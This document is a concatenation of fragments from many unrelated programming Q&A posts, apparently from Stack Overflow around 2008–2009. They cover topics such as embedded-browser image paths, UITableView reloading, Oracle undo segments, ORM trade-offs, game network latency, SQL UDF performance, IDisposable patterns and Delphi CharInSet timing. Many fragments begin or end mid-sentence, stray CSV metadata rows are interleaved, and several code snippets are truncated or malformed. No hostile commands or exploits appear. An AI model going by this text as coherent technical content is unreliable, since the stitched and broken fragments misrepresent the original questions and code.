<p>I tried using a relative reference: the app exe is in the bin\debug. The images live in the ""Images"" directory at the root of the project.  I've set the images to be copied to the output directory on compile, so they end up in bin\debug\Images*.  So I then use a reference like this ""Images..."" thinking it will be relative to the exe.  However, when I look at the image properties in the embedded browser window, I see the image URL to be ""about:blankImages/*"".  Everything seems to be relative to ""about:blank"" when HTML is written to the control.  Lacking a location context, I can't figure out what to use for a relative file resource reference.</p>

<p>I poked around the properties of the control to see if there is a way to set something to fix this.  I created a blank html page, and pointed the browser at it using the ""Navigate()"" method, using the full local path to the file.  This worked fine with the browser reporting the local ""file:///..."" path to the blank page.  Then I again wrote to the browser, this time using Document.Write().  Again, the browser now reports ""about:blank"" as the URL.</p>

<p>Short of writing the dynamic HTML results to a real file, is there no other way to reference a file resource?</p>

<p>I am going to try one last thing: constructing absolute file paths to the images and writing those to the HTML.  My HTML is being generated using an XSL transform of a serialized object's XML so I'll need to play with some XSL parameters which will take a little extra time as I'm not that familiar with them.</p>

I need to add rows to the table depending on data I get from another thread which I initiate from the RootViewController's thread. When I retun back from other thread to my RootViewController's thread I have the updated data, But I can't update the TableView. I called the <code>[self.tableview reloadData];</code> method but that doesnt seem to work. I also tried the <code>[self.tableview setNeedsDisplay]</code> call but with no success. How do I update the TableView with new data? </p>

- (void) reload {

for(int i=0;i&lt;[camDetails count];i++)
 {

    [tableEntry addObject:tString];
 }
 [self.tableView reloadData];
}
</code></pre>

<p>Then there is a receive class thread which is continuously receiving data. Its base class is NSObject. So, I used the Application delegate class ( which has an instance of RootViewController class ) to call this reload data method of the RootViewController class in my receive thread.</p>

    background: transparent url(/images/S.gif) center top no-repeat;
    width: 183px;

<p>From what I understood by reading some reliable-looking pages on the Internet (most notably this <a href=""http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID:275215756923"" rel=""noreferrer"">AskTom note</a> -- but don't bother with the comments), when a transaction is commited, the new data is <b>not</b> reported on the actual data block yet, but stays logged on the rollback segment. When someone issues a SELECT on the data, or when UNDO_RETENTION seconds have passed -- whichever of these two events happens first --, the new data is then (and only then) written on the data blocks.</p>

<p>But someone in our company, supposedly in the know, recently told me the opposite : according to him, when a transaction is commited, the new data <b>is</b> immediately written on the data blocks, and the rollback segment/undo tablespace keeps the old data for a duration of UNDO_RETENTION seconds. This old data stays available during this time for access by queries launched on SCNs prior to the transaction.</p>

<p>So, what really happens inside Oracle, and can you provide references to back up your reply ?</p>

I'm looking for a reason(s) why you would or have jumped one way or the other and also for items to add to my lists. I'm looking for the big ticket, big bang items. Also, items specific to a product, maybe, if they are really relevant. At this point I'm trying to evaluate ORM vs Manual not product A vs product B.</p>

<p>ORM Advantages</p>

<pre>
 - Quick to code and low maintenance (in some/most scenarios) 
 - Additional features for ""free"" (no developer effort)
</pre>

<p>Hand Coded Advantages</p>

<pre>
 - More Efficient (at runtime, maybe not at dev time?)
 - Less layers of complexity
 - Most ORMS seem to struggle with being retricted to sprocs only

<p>In the interests of full disclosure, I really don't like the idea of ""something"" executing code against <em>my</em> database that I can't directly modify, if I see fit but I can see the potentially massive development time advatages of an ORM.</p>

<p>Its probably also worth noting I'm in a .Net world</p>

<p>[edit]
(the question at <a href=""https://stackoverflow.com/questions/494816/using-an-orm-or-plain-sql"">Using an ORM or plain SQL?</a> seems to answer many of the questions and reinforce the point about performance)</p>

<p>Has any built an app using an ORM in the early stages and then gradually replaced with with a handcoded DAL? What were the pitfalls of this approach?</p>

<p>[Further Edit - getting to the heart of the problem now]
Having a website be able to execute any SQL against my database is scary. If all access is through sprocs my database lives in nice, safe, comfortable isolation. Using exclusively sprocs removes a lot of, if not all, SQL injection attack vectors. Any comments on that?</p>

<p>Say I have a one-to-many relationship between <code>Car</code> and <code>Manufacturer</code>. I want to have a form for updating <code>Car</code> that includes a select input for setting <code>Manufacturer</code>. I was hoping to be able to do this using the built-in model binding, but I'm starting to think I'll have to do it myself.</p>

<p>My action method signature looks like this:</p>

<pre><code>public JsonResult Save(int id, [Bind(Include=""Name, Description, Manufacturer"")]Car car)
</code></pre>

<p>The form posts the values Name, Description and Manufacturer, where Manufacturer is a primary key of type <code>int</code>. Name and Description get set properly, but not Manufacturer, which makes sense since the model binder has no idea what the PK field is. Does that mean I would have to write a custom <code>IModelBinder</code> that it aware of this? I'm not sure how that would work since my data access repositories are loaded through an IoC container on each <code>Controller</code> constructor.</p>

I'm a little new to this, and have already run into a lot of issues trying to put together a good plan for dead reckoning and network latency, so I'd love to see some good literature on the topic.  I'll describe the methods I've considered.</p>

<p>Originally, I just sent the player's input to the server, simulated there, and broadcast changes in the game state to all players.  This made cheating difficult, but under high latency things were a little difficult to control, since you dont see the results of your own actions immediately.</p>

<p><a href=""http://www.gamasutra.com/features/19970919/aronson_01.htm"" rel=""noreferrer"">This GamaSutra article</a> has a solution that saves bandwidth and makes local input appear smooth by simulating on the client as well, but it seems to throw cheat-proofing out the window.  Also, I'm not sure what to do when players start manipulating the environment, pushing rocks and the like.  These previously neutral objects would temporarily become objects the client needs to send PDUs about, or perhaps multiple players do at once.  Whose PDUs would win?  When would the objects stop being doubly tracked by each player (to compare with the dead reckoned version)?  Heaven forbid two players engage in a sumo match (e.g. start pushing each other).</p>

<p><a href=""http://www.gamedev.net/reference/articles/article1370.asp"" rel=""noreferrer"">This gamedev.net bit</a> shows the gamasutra solution as inadequate, but describes a different method that doesn't really fix my collaborative boulder-pushing example.  Most other things I've found are specific to shooters.  I'd love to see something more geared toward games that play like SNES Zelda, but with a little more physics / momentum involved.</p>

<li>Note: I'm not asking about physics simulation here -- other libraries have that covered.  Just strategies for making games smooth and reactive despite network latency.</li>

<p>My question is specifically about the .NET platform: Why are try blocks expensive?</p>

<p><strong>Summary of Responses:</strong> </p>

<p>There are clearly two camps on this issue: those that say that try blocks are expensive, and those that say ""maybe a tiny little bit"".</p>

<p>Those that say try blocks are expensive normally mention the ""high cost"" of unwinding the call stack. Personally, I'm not convinced by that argument - specially after reading about how exceptions handlers are stored <a href=""http://www.yoda.arachsys.com/csharp/exceptions2.html"" rel=""noreferrer"">here</a>.</p>

<p>Jon Skeet sits on the ""maybe a tiny little bit"" camp, and has written two articles on exceptions and performance which you can find <a href=""http://www.yoda.arachsys.com/csharp/exceptions2.html"" rel=""noreferrer"">here</a>.</p>

<p>There was one article that I found extremely interesting: it talked about ""other"" performance implications of try blocks (not necessarily memory or cpu consumption). Peter Ritchie mentions that he found that code inside try blocks is not optimized as it'd otherwise be by the compiler. You can read about his findings <a href=""http://msmvps.com/blogs/peterritchie/archive/2007/06/22/performance-implications-of-try-catch-finally.aspx"" rel=""noreferrer"">here</a>.</p>

<p>Finally, there's a blog entry about the issue from the man that implemented exceptions in the CLR. Go take a look at Chris Brumme's article <a href=""http://blogs.msdn.com/cbrumme/archive/2003/10/01/51524.aspx"" rel=""noreferrer"">here</a>.</p>

<p>Does it all boil down to using special machine-code on the CPU ? Does that CPU need a special co-processor or other gizmo without which you can't have sleep() ?</p>

<p>The best known incarnation of sleep() is in C (to be more accurate, in the libraries that come with C compilers, such as GNU's libc), although almost every language today has its equivalent, but the implementation of sleep in some languages (think Bash) is not what we're looking at in this question...</p>

<ol>
<li>a timer is set so that the kernel wakes the process at the due time, or</li>
<li>whenever the kernel is allowed a time slice, it polls the clock to check whether it's time to wake a process.</li>
</ol>

<p>The answers only mention alternative 1. Therefore, I ask: how does this timer behave ? If it's a simple interrupt to make the kernel wake the process, how can the kernel ask the timer to ""wake me up in 140 milliseconds so I can put the process in running state"" ?</p>

Most recently, I read James Bennett's <a href=""http://www.b-list.org/weblog/2008/dec/14/packaging/"" rel=""noreferrer"">On packaging</a> post on why no one should be using setuptools. From my time in #python on Freenode, I know that there are a few souls there who absolutely detest it. I would count myself among them, but I do actually use it.</p>

<p>I've used setuptools for enough projects to be aware of its deficiencies, and I would prefer something better. I don't particularly like the egg format and how it's deployed. With all of setuptools' problems, I haven't found a better alternative.</p>

<p>My understanding of tools like <a href=""http://pip.openplans.org/"" rel=""noreferrer"">pip</a> is that it's meant to be an easy_install replacement (not setuptools). In fact, pip uses some setuptools components, right?</p>

<p>Most of my packages make use of a setuptools-aware setup.py, which declares all of the dependencies. When they're ready, I'll build an sdist, bdist, and bdist_egg, and upload them to pypi.</p>

<p>If I wanted to switch to using pip, what kind of changes would I need to make to rid myself of easy_install dependencies? Where are the dependencies declared? I'm guessing that I would need to get away from using the egg format, and provide just source distributions. If so, how do i generate the egg-info directories? or do I even need to?</p>

<p>How would this change my usage of virtualenv? Doesn't virtualenv use easy_install to manage the environments?</p>

<p>How would this change my usage of the setuptools provided ""develop"" command? Should I not use that? What's the alternative?</p>

<p>I'm basically trying to get a picture of what my development workflow will look like.</p>

<p>Before anyone suggests it, I'm not looking for an OS-dependent solution. I'm mainly concerned with debian linux, but deb packages are not an option, for the reasons Ian Bicking outlines <a href=""http://blog.ianbicking.org/2008/12/14/a-few-corrections-to-on-packaging/"" rel=""noreferrer"">here</a>.</p>

    (SELECT id FROM user WHERE user_pk = updated_by) AS updater,
    (SELECT id FROM user WHERE user_pk = owned_by) AS owner,
    [name]
FROM asset
</code></pre>

<p>As I'm using this subquery a lot (that is, I have about 50 tables with these fields), and I might need to add some more code to the subquery (for example, ""AND active = 1"" ) I thought I'd put these into a user-defined function <a href=""http://en.wikipedia.org/wiki/User-defined_function"" rel=""noreferrer"">UDF</a> and use that. But the performance using that UDF was abysmal.</p>

<pre><code>CREATE FUNCTION dbo.get_user ( @user_pk INT )
RETURNS INT
AS BEGIN 
    RETURN ( SELECT id
             FROM   ice.dbo.[user]
             WHERE  user_pk = @user_pk )
END

SELECT dbo.get_user(created_by) as creator, [name]

<p>The performance of #1 is less than 1 second. Performance of #2 is about 30 seconds...</p>

<p>Why, or more importantly, is there any way I can code in SQL server 2008, so that I don't have to use so many subqueries?</p>

<h3>Edit:</h3>

<p>Just a litte more explanation of when this is useful. This simple query (that is, get userid) gets a lot more complex when I want to have a text for a user, since I have to join with profile to get the language, with a company to see if the language should be fetch'ed from there instead, and with the translation table to get the translated text. And for most of these queries, performance is a secondary issue to readability and maintainability.</p>

However, I don't see an easy way of knowing when I'm slipping up.  Visual Studio doesn't seem to indicate this in any way (am I just missing something?).  Am I just supposed to check help every time I declare anything, and gradually build up an encyclopedic memory for which objects are and which are not disposable?  Seems unnecessary, painful, and error-prone.</p>

<p>How do <em>you</em> handle this?</p>

<p><strong>EDIT:</strong></p>

<p>Looking at the related questions sidebar, I found <a href=""https://stackoverflow.com/questions/2785/setting-objects-to-nullnothing-after-use-in-dot-net"">another question</a> which made it clear that <code>Dispose()</code> is supposed to be called by the object's finalizer anyway.  So even if you never call it yourself, it should eventually happen, meaning you won't have a memory leak if you don't use <code>using</code> (which is what I suppose I was really worried about all along).  The only caveat is that the garbage collector doesn't know how much extra memory is being held by the object as unmanaged stuff, so it won't have an accurate idea how much memory will be freed by collecting the object.  This will result in less-ideal-than-usual performance by the garbage collector.</p>

<p>In short, it's not the end of the world if I miss a <code>using</code>.  I just wish something would generate at least a warning for it.</p>

<p>Now.  Given that, why is it so easy &mdash; hell, why is it even <em>allowed</em> &mdash; to do it wrong?  You have to go out of your way to do it right.  Doing it like everything else results in armageddon (apparently).  So much for encapsulation, huh?</p>

<p>@James: I'm extending the MovieClip class and then creating objects from inside the cllass (including the textfield) in code, which complicates things a bit (if only in my fragile brain). The weird thing is that I've set buttonMode = true on the MC, and it applies to everything except the TextField, when it reverts to the caret (or just the pointer if I set Selectable = false on the TextField).</p>

"668440","1","668469","","2009-03-21 00:15:21","","12","9559","<p>When implementing IDisposable correctly, most implementations, including the framework guidelines, suggest including a <code>private bool disposed;</code> member in order to safely allow multiple calls to <code>Dispose()</code>, <code>Dispose(bool)</code> as well as to throw <a href=""http://msdn.microsoft.com/en-us/library/system.objectdisposedexception.aspx"" rel=""noreferrer"">ObjectDisposedException</a> when appropriate.</p>

<p>This works fine for a single class.  However, when you subclass from your disposable resource, and a subclass contains its own native resources and unique methods, things get a little bit tricky.  Most samples show how to override <code>Dipose(bool disposing)</code> correctly, but do not go beyond that to handling <code>ObjectDisposedException</code>.</p>

<p>There are two questions that I have in this situation.</p>

<hr>

<p>First:</p>

<p>The subclass and the base class both need to be able to track the state of disposal.  There are a couple of main options I know of -</p>

<ul>
<li><p>1) Declare private bool disposed; in both classes.  Each class tracks its own this.disposed, and throws as needed.</p></li>
<li><p>2) Use protected bool Disposed { get; private set; } instead of a field.  This would let the subclass check the disposed state.</p></li>
<li><p>3) Provide some protected helper method to check the disposed state, and throw by pulling the current type name via reflection if the object is disposed.</p></li>
</ul>

<p>The advantages as disadvantages I see to each by option are:</p>

<ul>
<li><p>1) This ""smells"" to me since it contains duplicated booleans, but seems to work fine.  I often use this when subclassing other code.</p></li>
<li><p>2) This takes out the duplicated booleans, but is not the way the design guidelines books are written, etc.  This is what I typically use, though, since it keeps it a single point for state.</p></li>
<li><p>3) This seems like the cleanest option to me, but doesn't appear in standard guidelines.  It may be a little less expected of an approach than others from users of the class.</p></li>
</ul>

<p>I, at one point or another, have tried using all three of these approaches.  I would like to know advantages and disadvantages to the three approaches, as well as any other ideas for a cleaner, better way to handle this.  What choice would you make in handling this, and why?</p>

<hr>

<p>Second:</p>

<p>When throwing the <code>ObjectDisposedException</code>, what do you use for the name argument?  I know the ""typical"" method call is:</p>

<p><code><pre>
throw new ObjectDisposedException(GetType().FullName);
</pre></code></p>

<p>There is a comment <a href=""http://msdn.microsoft.com/en-us/library/system.objectdisposedexception.aspx"" rel=""noreferrer"">on this page</a> from a Microsoft employee suggesting that implementing the concrete class's full name is the appropriate usage.</p>

<p>In the third option above, this would be the only meaningful choice.  However, if the class implements the throwing itself, you could potentially return the name of the class that defines the method that was called.  (ie: the base class could return the base class's name, not the concrete subclass)</p>

<p>I don't think this is a good idea - but I ran into this on some code written by somebody else.  Are there advantages or disadvantages to having the name of the class implementing the method returned?</p>

<p>Since a DataReader is the quickest data retrieval mechanism, I will want to use this as the result type of the ""GetData"" method.

  <p>For original character sequences that

  difficult. Internet protocols that transmit octet sequences intended to
  represent character sequences are expected to provide some way of
  identifying the charset used, if there might be more than one

<p>I'm using Named Pipes and have two instances of another application that act as clients to the above WCF service (running in a WinForms application).  I thought based on the ConcurrencyMode setting of Multiple that when Client1 calls the Test Service, Client2 doesn't have to wait till the first call is complete.  However, when Client1 calls TestIt, Client2 blocks until the call from Client1 is complete!?!?!  Shouldn't it make a new instance each time based on the above settings?</p>

<p>Also, is the best way to keep a WinForms application that is hosting a WCF service responsive is by running the WCF service on a separate thread?</p>

<p>NOTE: Setting [CallbackBehavior(UseSynchronizationContext = false)] on the Test class does not alleviate the problem.  The service still only responds to one request at a time.</p>

The general usage scenario would be that a user would leave it open all day and take a glance at it now and then.</p>

<p>I am encountering a problem where the browsers memory footprint is growing slowly over time.   This is happening in both Firefox and IE 7 (Although not in Chrome). After a few hours, it can cause IE7 to have a footprint of ~200MB and FF3 to have a footprint of ~400MB.</p>

<p>After a lot of testing, I have found that the memory leak only occurs if the AJAX calls are being responded to.  If the server doesn't respond to anything, I can leave the page open for hours and the footprint won't grow.</p>

<p>I am using prototype for my AJAX calls.  So, I'm guessing there is an issue with the onSuccess callback creating these memory leaks.  </p>

<p>Does anyone have any tips on preventing memory leaks with prototype / AJAX?    Or any methods on how to troubleshoot this problem?</p>

<p>One big requirement is that the office layout can be flexible (i.e. team areas can be created and changed as necessary).</p>

<p>People are reluctant about this change but I'm not sure if thats just because people don't like change or if there is a real reason behind it. I've moved my setup out of the corner onto a straight edge to see how much impact it has on myself.</p>

<p>We've also been told that this is now happening across the industry... that people are being moved out of their corners into more bench-like arrangement.</p>

The specific game is similar to poker known as <a href=""http://en.wikipedia.org/wiki/Three_card_brag"" rel=""nofollow noreferrer"">Three Card Brag</a>. The game is played in the movie <em>Lock, Stock and Two Smoking Barrels</em>.</p>

<p>I have been reading up on some of the topics on SO regarding game development, though mostly <a href=""https://stackoverflow.com/questions/361002/any-patterns-for-modelling-board-games"">this question</a>.  This has helped revamp the original way I was creating the objects.  </p>

<p>One particular problem I am having is defining game state. My initial approach was to separate everything (e.g. keeping chip stacks inside a <code>Player</code> class) but after reading the responses to the <a href=""https://stackoverflow.com/questions/361002/any-patterns-for-modelling-board-games"">question</a> I mentioned previously, it seems as though all possible states of the game should be maintained within a <code>GameState</code> object.  What I came up with is essentially this:</p>

<pre><code>abstract class CardGameState
{
    protected List&lt;Player&gt; _Players;
    protected Player _CurrentPlayer;
    protected Dictionary&lt;Player, int&gt; _Chips;
    protected Dictionary&lt;Player, Hand&gt; _CurrentHand;
    protected Dictionary&lt;Player, PlayerStatuses&gt; _PlayerStatus; // PlayerStatuses.InHand, PlayerStatuses.Folded, PlayerStatuses.SittingOut, etc.
    /* etc. */
</code></pre>

<p>where each <code>CardGameState</code> is modified by some action:</p>

<pre><code>public interface IAction
{
    string Name { get; }

    CardGameState Apply(CardGameState state);
    bool IsLegal(CardGameState state);
}
</code></pre>

<p>Now I'm feeling very strongly that this is defeating the purpose of object-oriented programming, because the data specifically related to the player (in this case, his chip stack, hand, and current status) is not encapsulated by the <code>Player</code> object. </p>

<p>On the other hand, if a player were to raise the bet, I would be creating a <code>RaiseAction</code> that implements <code>IAction</code>, but the <code>IAction</code> interface only accepts the current game state, which I don't believe would be ideal if the chip stacks were stored within the <code>Player</code> class.</p>

<p>Basically, my question is: can I have the best of both worlds such that I can have an exact representation of the game state while simultaneously keeping all data related specifically to an object within the game state inside its given object?</p>

These are 200 separate insert and/or update statements.  Now the obvious thing to do is reduce this number but, like I said, for reasons I won't bother going into I can't do this.</p>

<p>I wasn't expecting this problem.  Selects seem reasonably performant in MySQL but inserts/updates aren't (it takes about 15-20 seconds to do this update, which is naturally unacceptable).  I've written Java/Oracle systems that can happily do thousands of inserts/updates in the same time (in both cases running local databases; MySQL 5 vs OracleXE).</p>

<p>Now in something like Java or .Net I could quite easily do one of the following:</p>

<ol>
<li>Write the data to an in-memory
write-behind cache (ie it would
know how to persist to the database
and could do so asynchronously);</li>
<li>Write the data to an in-memory cache
and use the PaaS (Persistence as a
Service) model ie a listener to the
cache would persist the fields; or</li>
<li>Simply start a background process
that could persist the data.</li>
</ol>

<p>The minimal solution is to have a cache that I can simply update, which will separately go and upate the database in its own time (ie it'll return immediately after update the in-memory cache).  This can either be a global cache or a session cache (although a global shared cache does appeal in other ways).</p>

So I have a .NET app which goes thru and generates a series of files, outputs them to a local directory and then determines if it needs to update an existing file or add a new file into a TFS (Team Foundation Server) project.
<br>
I have a single workspace on my local machine and there are 10 different working folders that are other coding projects I have worked on from this particular machine.  My problem happens when I go to check if the file already exists in the TFS project and an update is required or if needs to be added to the project as a new file.
<br>
snipet:</p>

<pre>
static string TFSProject = @""$/SQLScripts/"";

wsInfo = Workstation.Current.GetLocalWorkspaceInfo(argPath);
TeamFoundationServer tfs = new TeamFoundationServer(wsInfo.ServerUri.AbsoluteUri);
versionControl = (VersionControlServer)tfs.GetService(typeof(VersionControlServer));

Workspace workspace = versionControl.GetWorkspace(wsInfo);
workspace.GetLocalItemForServerItem(TFSProject);
</pre>

<p><br>
At this point I check if the file exists and I do one of two things.  if the file exists, then I mark the file for EDIT and then I writeout the file to the local directory, otherwise I will script the file first and then ADD the file to the workspace.  I dont care if the physical file is identical to the one I am generating as I am doing this as a SAS70 requirement to 'track changes'<br><br>
If it exists I do:<br>
workspace.PendEdit(filename,RecurisionType.Full);<br>
scriptoutthefile(filename);<br>
<br>
or if it doesn't exist<br>
scriptoutthefilename(filename);<br>
workspace.PendAdd(filename,true);<br>
<br>
Ok, all of that to get to the problem. When I go to check on pending changes against the PROJECT I get all the pending changes for all of the projects I have on my local machine in the workspace.</p>

<ul>
<li>New problem areas for our products to solve </li>
<li>New functionality supporting existing problem areas</li>
<li>New functionality requested by our existing users</li>
<li>Usability and ""look"" enhancements</li>
<li>Architectural upgrades to the back-end</li>
<li>Bug fixes</li>
</ul>

<p>Managing all of these in a sensible fashion is a job that falls to Product Management, but it is tricky for a lot of reasons.  Firstly, we have a number of different systems that hold the different things (market requirements document in files, bugs in a bug database, customer requirements in our help desk system, enginering's wish-list on our intranet, etc).  And secondly, many of the items are of wildly different size, scope, complexity and of course value, which means that choosing isn't as simple as just ordering a list by priority.  </p>

<p>Because we now are fairly large, have a complex product and lots of customers, the basic solutions (a spreadsheet, a google doc, a basecamp to-do list) just isn't sufficient to deal with this.  We need a way to group things together in various ways, prioritise them on an ongoing basis, make it clear what we're doing and what is coming - without it requiring all of someone's time to just manage some tool.</p>

<p>How do you manage this in a way that allows the business to always do what is most valuable to existing customers, helps get new ones, and keeps the software innards sane?</p>

<p>Note that this is different from the development-side, which I think we have down pretty well.  We develop everything in an iterative, agile fashion, and once something has been chosen for design and implementation, we can do that.  It's the part where we need to figure out what to do next that's hardest!</p>

<p>Have you found a method or a tool that works?  If so, please share!  (And if you would like to know the answer too, rate up the question so it stays visible :)</p>

<p><I>Addendum:</i> Of course it's nice to fix all the bugs first, but in a real system that actually is installed on customers' machines, that is not always practical.  For example, we may have a bug that only occurs very rarely and that it would take a huge amount of time and architectural upheaval to fix - we might leave that for a while.  Or we might have a bug where someone thinks something is hard to use, and we think fixing it should wait for a bigger revamp of that area.  So, there are lots of reasons why we don't just fix them all straight away, but keep them open so we don't forget.  Besides, it is the prioritization of the non-bugs that is the hardest; just imagine we don't have any :)</p>

<p>Do any of the other major database vendors have something similar?</p>

<h2>Edit</h2>

<p>Let me be more specific with type of features I'm looking for</p>

<p>In MS SQL you can use this query</p>

<pre><code>SELECT so.id AS '@Id',
       so.Code AS '@Code',

            LEFT JOIN tblPart pa ON pa.Id = si.Part_Id
        WHERE si.SalesOrder_ID = so.Id 
        FOR XML PATH('SalesItem') , type) 
FROM tblSalesOrder so
    JOIN tblCustomer cu ON so.customer_id = cu.ID
FOR XML PATH('SalesOrder'), ROOT('SalesOrders')
</code></pre>

<p>to generate this XML</p>

<pre><code>&lt;SalesOrders&gt;

    &lt;Customer Code=""ROBERTS   "" Name=""Roberts Equipment  Inc."" /&gt;

    &lt;SalesItem Item=""2"" PartCode=""FP-0003"" /&gt;
  &lt;/SalesOrder&gt;
  &lt;SalesOrder Id=""15"" Code=""C1004     ""&gt;

    &lt;SalesItem Item=""1"" /&gt;
  &lt;/SalesOrder&gt;
&lt;/SalesOrders&gt;
</code></pre>

<p>I can control the use of elements and attributes on a column by column basis.   I can create attributes of elements to group related columns together. I can use sub-queries to generate nested elements.  You can even use functions that return XML to generate trees that are arbitrary depth.</p>

"332948","1","332975","","2008-12-02 03:26:32","","18","9618","<p>I'm perplexed. At CodeRage today, Marco Cantu said that CharInSet was slow and I should try a Case statement instead. I did so in my parser and then checked with AQTime what the speedup was. I found the Case statement to be much slower.</p>

<p>4,894,539 executions of:</p>

<blockquote>
  <p>while not CharInSet (P^, [' ', #10,#13, #0]) do inc(P);</p>
</blockquote>

<p>was timed at 0.25 seconds.</p>

<p>But the same number of executions of:</p>

<blockquote>
  <p>while True do<br>
  &nbsp;&nbsp;case P^ of<br>
  &nbsp;&nbsp;&nbsp;&nbsp;' ', #10, #13, #0: break;<br>
  &nbsp;&nbsp;&nbsp;&nbsp;else inc(P);<br>
  &nbsp;&nbsp;end;</p>
</blockquote>

<p>takes .16 seconds for the ""while True"", .80 seconds for the first case, and .13 seconds for the else case, totaling 1.09 seconds, or over 4 times as long.</p>

<p>The assembler code for the CharInSet statement is:</p>

<blockquote>
  <p>add edi,$02<br>
  mov edx,$0064b290<br>
  movzx eax,[edi]<br>
  call CharInSet<br>
  test a1,a1<br>
  jz $00649f18  (back to the add statement)</p>
</blockquote>

<p>whereas the case logic is simply this:</p>

<blockquote>
  <p>movzx eax,[edi]<br>
  sub ax,$01<br>
  jb $00649ef0<br>
  sub ax,$09<br>
  jz $00649ef0<br>
  sub ax,$03<br>
  jz $00649ef0<br>
  add edi,$02<br>
  jmp $00649ed6  (back to the movzx statement)</p>
</blockquote>

<p>The case logic looks to me to be using very efficient assembler, whereas the CharInSet statement actually has to make a call to the CharInSet function, which is in SysUtils and is also simple, being:</p>

<blockquote>
  <p>function CharInSet(C: AnsiChar; const CharSet: TSysCharSet): Boolean;<br>
  begin<br>
    Result := C in CharSet;<br>
  end;</p>
</blockquote>

<p>I think the only reason why this is done is because P^ in [' ', #10, #13, #0] is no longer allowed in Delphi 2009 so the call does the conversion of types to allow it.</p>

<p>None-the-less I am very surprised by this and still don't trust my result.</p>

<p>Is AQTime measuring something wrong, am I missing something in this comparison, or is CharInSet truly an efficient function worth using?</p>

<hr>

<p>Conclusion: </p>

<p>I think you got it, Barry. Thank you for taking the time and doing the detailed example. I tested your code on my machine and got .171, .066 and .052 seconds (I guess my desktop is a bit faster than your laptop).</p>

<p>Testing that code in AQTime, it gives: 0.79, 1.57 and 1.46 seconds for the three tests. There you can see the large overhead from the instrumentation. But what really surprises me is that this overhead changes the apparent ""best"" result to be the CharInSet function which is actually the worst.</p>

<p>So Marcu is correct and CharInSet is slower. But you've inadvertently (or maybe on purpose) given me a better way by pulling out what CharInSet is doing with the AnsiChar(P^) in Set method. Other than the minor speed advantage over the case method, it is also less code and more understandable than using the cases.</p>

<p>You've also made me aware of the possibility of incorrect optimization using AQTime (and other instrumenting profilers). Knowing this will help my decision re <a href=""https://stackoverflow.com/questions/291631/profiler-and-memory-analysis-tools-for-delphi"">Profiler and Memory Analysis Tools for Delphi</a> and it also is another answer to my question <a href=""https://stackoverflow.com/questions/322315/how-does-aqtime-do-it"">How Does AQTime Do It?</a>. Of course, AQTime doesn't change the code when it instruments, so it must use some other magic to do it.</p>

<p>So the answer is that AQTime is showing results that lead to the incorrect conclusion.</p>

<hr>

<p>Followup: I left this question with the ""accusation"" that AQTime results may be misleading. But to be fair, I should direct you to read through this question: <a href=""https://stackoverflow.com/questions/1694001/is-there-a-fast-gettoken-routine-for-delphi"">Is There A Fast GetToken Routine For Delphi?</a> which started off thinking AQTime gave misleading results, and concludes that it does not.</p>

When I first posted the question, I said it was skipping the first row; later I realized that it actually only read the last row and I've edited the text accordingly (at that time all the records were grouped in two rows and it appeared to skip the first when it actually only showed the last). This may be caused by the fact that it didn't have a unique identifier by which to distinguish between the rows returned by MySQL so adding the <code>ORDER BY</code> statement caused it to create a unique identifier for each row.<br />
This is just a theory and I have nothing to support it, but all my tests seem to lead to the same result.</p>

<p>When starting in Forth, one typically learns about the stack and its operators (DROP, DUP, SWAP, etc.) first, so it's natural to think of these as being among the primitive operators. But they're not. Each of them can be broken down into operators that directly manipulate memory and the stack pointers. Later one learns about store (!) and fetch (@) which can be used to implement DUP, SWAP, and so forth (ha!).</p>

<p>So what are the primitive operators? Which ones must be implemented directly in the runtime environment from which all others can be built? I'm not interested in high-performance; I want something that I (and others) can learn from. Operator optimization can come later.</p>

I am designing a database schema, I have a good idea of the requirements and now its a matter of getting it into black and white.</p>

<p>In this pseudo-database-layout, I have a table of customers, table of orders and table of products.</p>

<p><strong>TBL_PRODUCTS:</strong><BR>
ID<BR>
Description<BR>
Details<BR></p>

<p><strong>TBL_CUSTOMER:</strong><BR>
ID<BR>
Name<BR>
Address<BR></p>

<p><strong>TBL_ORDER:</strong><BR>
ID<BR>
TBL_CUSTOMER.ID<BR>
prod1<BR>
prod2<BR>
prod3<BR>
etc<BR></p>

<p>Each 'order' has only one customer, but can have any number of 'products'.</p>

<p>The problem is, in my case, the products for a given order can be any amount (hundreds for a single order) on top of that, each product for an order needs more than just a 'quantity' but can have values that span pages of text for a specific product for a specific order.
My question is, how can I store that information?</p>

<p>Assuming I can't store a variable length array as single field value, the other option is to have a string that is delimited somehow and split by code in the application.
An order could have say 100 products, each product having either only a small int, or 5000 characters or free text (or anything in between), unique only to that order.</p>

<p>On top of that, each order must have it's own audit trail as many things can happen to it throughout it's lifetime.
An audit trail would contain the usual information - user, time/date, action and can be any length.
Would I store an audit trail for a specific order in it's own table (as they could become quite lengthy) created as the order is created?</p>

<p>Are there any places where I could learn more about techniques for database design?</p>

One of the things I stumbled upon is that there seems to be no way to edit the repository without first pulling all files in that repository to a local working folder in the local workspace. I'm using Visual Studio 2008 Team Explorer.</p>

<p>My repository resembles this structure:</p>

<pre><code>$
$/branches
$/trunk
$/trunk/Solution1
$/trunk/Solution1/... etc.
</code></pre>

<p>Now what I want to do is add a new folder in the root of the trunk (i.e. $/trunk/Docs). Because the Solution1 folder tree ($/trunk/Solution1) contains a lot of data, I don't want to first get a local copy of that folder. I want to create the new ""Docs"" folder server-side. However, I noticed the ""New Folder"" button on the Source Control Explorer toolbar is grayed out when the selected repository folder isn't available as a working folder in the local workspace.</p>

<p>Using SVN this never was a problem, because using TortoiseSVN I can create a new folder server-side using the Repo-Browser. SVN doesn't require you to check out its parent folder first.</p>

"60051","1","60411","","2008-09-12 21:55:24","","2","9642","<p>My question is pertaining to the best practice for accessing a child object's parent. So let's say a class instantiates another class, that class instance is now referenced with an object. From that child object, what is the best way to reference back to the parent object? Currently I know of a couple ways that I use often, but I'm not sure if A) there is a better way to do it or B) which of them is the better practice</p>

<p>The first method is to use getDefinitionByName, which would not instantiate that class, but allow access to anything inside of it that was publicly declared.</p>

<pre><code>_class:Class = getDefinitionByName(""com.site.Class"") as Class;
</code></pre>

<p>And then reference that variable based on its parent to child hierarchy.<br>
Example, if the child is attempting to reference a class that's two levels up from itself:</p>

<pre><code>_class(parent.parent).function();
</code></pre>

<p>This seems to work fine, but you are required to know the level at which the child is at compared to the level of the parent you are attempting to access.</p>

<p>I can also get the following statement to trace out [object ClassName] into Flash's output.</p>

<pre><code>trace(Class);
</code></pre>

<p>I'm not 100% on the implementation of that line, I haven't persued it as a way to reference an object outside of the current object I'm in.</p>

